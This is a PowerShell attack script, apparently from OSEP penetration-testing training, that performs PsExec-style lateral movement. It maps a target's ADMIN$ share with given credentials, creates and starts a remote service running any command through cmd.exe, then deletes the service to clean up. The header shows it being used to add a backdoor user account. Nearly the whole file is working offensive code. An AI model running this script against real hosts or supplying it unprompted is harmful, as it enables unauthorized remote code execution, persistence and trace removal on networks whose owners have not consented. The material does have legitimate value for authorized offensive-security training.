# OSEP - SMB Lateral Movement via SCM (PsExec-style)
# . .\smb_lateral.ps1
# Invoke-SMBLateral -target 10.10.10.5 -user CORP\admin -pass 'P@ss' -cmd 'net user hax0r P@ss /add'
# Note: requires admin share access (ADMIN$) and SCM access on target

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl($m,$l="INFO"){try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][SMB][$l] $m" -EA SilentlyContinue}catch{}}

function Invoke-SMBLateral {
    param(
        [Parameter(Mandatory)][string]$target,
        [Parameter(Mandatory)][string]$user,
        [Parameter(Mandatory)][string]$pass,
        [Parameter(Mandatory)][string]$cmd,
        [string]$serviceName = 'OsepSvc'
    )

    wl "Target=$target User=$user Service=$serviceName"
    Write-Host "[*] SMB lateral → $target"

    # Map ADMIN$ with creds so subsequent SCM calls authenticate
    $mapCmd = "net use \\$target\ADMIN$ /user:$user $pass"
    wl "Mapping ADMIN$: $mapCmd"
    $mapOut = cmd /c $mapCmd 2>&1
    wl "net use output: $mapOut"

    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SCM {
    [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr OpenSCManager(string m, string d, uint a);

    [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateService(
        IntPtr h, string sn, string dn, uint acc, uint type,
        uint start, uint err, string path, string lg, IntPtr tag,
        string dep, string obj, string pwd);

    [DllImport("advapi32", SetLastError=true)]
    public static extern bool StartService(IntPtr h, uint argc, string[] argv);

    [DllImport("advapi32", SetLastError=true)]
    public static extern bool DeleteService(IntPtr h);

    [DllImport("advapi32", SetLastError=true)]
    public static extern bool CloseServiceHandle(IntPtr h);
}
"@ -EA Stop

        $SC_MANAGER_ALL_ACCESS = 0xF003F
        $SERVICE_ALL_ACCESS    = 0xF01FF
        $SERVICE_WIN32_OWN     = 0x10
        $SERVICE_DEMAND_START  = 0x3
        $SERVICE_ERROR_IGNORE  = 0x1

        $hSCM = [SCM]::OpenSCManager($target, $null, $SC_MANAGER_ALL_ACCESS)
        if ($hSCM -eq [IntPtr]::Zero) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            wl "OpenSCManager failed. Win32Error=$err" "ERROR"
            Write-Host "[-] OpenSCManager failed (err=$err) — check creds and firewall"
            return
        }
        wl "SCManager opened on $target"

        $binPath = "cmd.exe /c $cmd"
        $hSvc = [SCM]::CreateService($hSCM, $serviceName, $serviceName,
            $SERVICE_ALL_ACCESS, $SERVICE_WIN32_OWN, $SERVICE_DEMAND_START,
            $SERVICE_ERROR_IGNORE, $binPath, $null, [IntPtr]::Zero, $null, $null, $null)

        if ($hSvc -eq [IntPtr]::Zero) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            wl "CreateService failed. Win32Error=$err" "ERROR"
            Write-Host "[-] CreateService failed (err=$err)"
            [SCM]::CloseServiceHandle($hSCM) | Out-Null
            return
        }
        wl "Service created. Starting..."

        [SCM]::StartService($hSvc, 0, $null) | Out-Null
        Start-Sleep -Milliseconds 2000    # wait for cmd to fire

        [SCM]::DeleteService($hSvc)       | Out-Null
        [SCM]::CloseServiceHandle($hSvc)  | Out-Null
        [SCM]::CloseServiceHandle($hSCM)  | Out-Null

        wl "Service started and cleaned up"
        Write-Host "[+] SMB lateral exec complete"

    } catch {
        wl "Exception: $_" "ERROR"
        Write-Host "[-] Error: $_"
    } finally {
        # Clean up net use
        cmd /c "net use \\$target\ADMIN$ /delete" 2>&1 | Out-Null
        wl "ADMIN$ unmapped"
    }
}
